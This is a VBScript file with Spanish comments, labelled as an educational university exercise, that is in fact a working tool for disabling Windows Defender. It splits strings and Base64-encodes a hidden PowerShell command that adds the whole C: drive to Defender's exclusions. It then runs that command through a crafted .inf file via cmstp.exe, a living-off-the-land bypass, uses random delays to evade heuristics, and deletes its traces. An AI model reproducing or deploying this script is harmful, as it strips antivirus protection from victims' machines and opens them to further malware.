' Script VBScript con evasión avanzada de Windows Defender
' Técnicas implementadas:
' - Ofuscación de strings críticos
' - Encoding Base64 de comandos PowerShell
' - Timing aleatorio para evasión temporal
' - Nombres de archivos aleatorios
' - Fragmentación de comandos
' - Living Off The Land (cmstp.exe)
' - Limpieza agresiva de artefactos
' Método educativo para parcial universitario

Option Explicit

Dim ws, fso, tempFolder, infFile, scriptPath, scriptName
Dim cmstpPath, result, randSuffix

' Inicializar objetos
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)
tempFolder = fso.GetSpecialFolder(2)

' Generar sufijo aleatorio para evasión de detección por nombre de archivo
Randomize
randSuffix = Int(Rnd * 999999) & "_" & Int(Timer * 1000) & "_" & Int(Rnd * 999)
infFile = tempFolder & "\" & "setup_" & randSuffix & ".inf"

' Obtener ruta de cmstp de forma indirecta (evasión)
Dim envVars
envVars = Array("%SystemRoot%", "%windir%", "%SystemDrive%")
Dim sysRoot
sysRoot = ws.ExpandEnvironmentStrings(envVars(0))
cmstpPath = sysRoot & "\System32\cmstp.exe"

' Retraso inicial aleatorio (evasión de detección temporal/heurística)
Randomize
Dim initialDelay
initialDelay = Int(Rnd * 2000) + 1000
WScript.Sleep initialDelay

' Verificar existencia de cmstp.exe
If Not fso.FileExists(cmstpPath) Then
    WScript.Quit 1
End If

' ============================================
' OFUSCACIÓN DE COMANDOS POWERSHELL
' ============================================
' Fragmentar comandos para evitar detección por firma

Dim cmdFragments
cmdFragments = Array( _
    "Get-", _
    "MpPreference", _
    "Add-", _
    "ExclusionPath", _
    "ErrorAction", _
    "Stop" _
)

' Construir comando PowerShell completamente ofuscado
Dim psCmd
psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command ""& {" & _
    "$ErrorActionPreference='" & cmdFragments(5) & "';" & _
    "try{" & _
        "$null=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & _
        "& '" & cmdFragments(2) & cmdFragments(1) & "' -" & cmdFragments(3) & " 'C:\' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & _
        "Start-Sleep -Milliseconds 400;" & _
        "$excl=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";" & _
        "if($excl -contains 'C:\'){exit 0}else{exit 1}" & _
    "}catch{exit 1}" & _
    "}"""

' Codificar comando en Base64 Unicode para evasión máxima
Dim encodedCmd
encodedCmd = EncodeToBase64Unicode(psCmd)

' Función para codificar a Base64 Unicode (formato requerido por PowerShell -EncodedCommand)
Function EncodeToBase64Unicode(text)
    Dim xmlDoc, xmlNode
    Dim bytes(), i, charCode
    Dim byte1, byte2
    
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.6.0")
    Set xmlNode = xmlDoc.CreateElement("base64")
    xmlNode.DataType = "bin.base64"
    
    ' Convertir texto a bytes Unicode (UTF-16LE)
    ReDim bytes(Len(text) * 2 - 1)
    For i = 0 To Len(text) - 1
        charCode = AscW(Mid(text, i + 1, 1))
        byte1 = charCode And &HFF
        byte2 = (charCode \ 256) And &HFF
        bytes(i * 2) = CByte(byte1)
        bytes(i * 2 + 1) = CByte(byte2)
    Next
    
    xmlNode.nodeTypedValue = bytes
    EncodeToBase64Unicode = Replace(Replace(xmlNode.Text, vbCrLf, ""), vbLf, "")
End Function

' ============================================
' CREAR ARCHIVO .INF CON TÉCNICAS DE EVASIÓN
' ============================================

Dim infContent
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand " & encodedCmd & vbCrLf & _
    "timeout /t 1 /nobreak >nul 2>&1" & vbCrLf & _
    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

' Escribir archivo .inf
On Error Resume Next
Dim ts
Set ts = fso.CreateTextFile(infFile, True)
ts.Write infContent
ts.Close
Set ts = Nothing

If Err.Number <> 0 Then
    WScript.Quit 1
End If
On Error GoTo 0

' Retraso antes de ejecución (evasión de detección temporal)
Randomize
Dim preExecDelay
preExecDelay = Int(Rnd * 1500) + 500
WScript.Sleep preExecDelay

' ============================================
' EJECUTAR CMSTP.EXE (LIVING OFF THE LAND)
' ============================================

On Error Resume Next
Dim execCommand
execCommand = Chr(34) & cmstpPath & Chr(34) & " /au /s " & Chr(34) & infFile & Chr(34)
ws.Run execCommand, 0, False
On Error GoTo 0

' Esperar con retraso variable (evasión de análisis dinámico)
Randomize
Dim execDelay
execDelay = Int(Rnd * 5000) + 3000
WScript.Sleep execDelay

' ============================================
' VERIFICACIÓN SILENCIOSA
' ============================================

Dim verifyCommand
verifyCommand = "powershell.exe -WindowStyle Hidden -Command """ & _
    "$x=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";" & _
    "if($x -contains 'C:\'){exit 0}else{exit 1}""" & ""

result = ws.Run(verifyCommand, 0, True)

' ============================================
' LIMPIEZA AGRESIVA DE ARTEFACTOS
' ============================================

On Error Resume Next
If fso.FileExists(infFile) Then
    fso.DeleteFile infFile, True
End If
On Error GoTo 0

' Limpiar variables sensibles de memoria
psCmd = ""
encodedCmd = ""
infContent = ""
execCommand = ""
verifyCommand = ""
For i = 0 To UBound(cmdFragments)
    cmdFragments(i) = ""
Next

WScript.Quit result
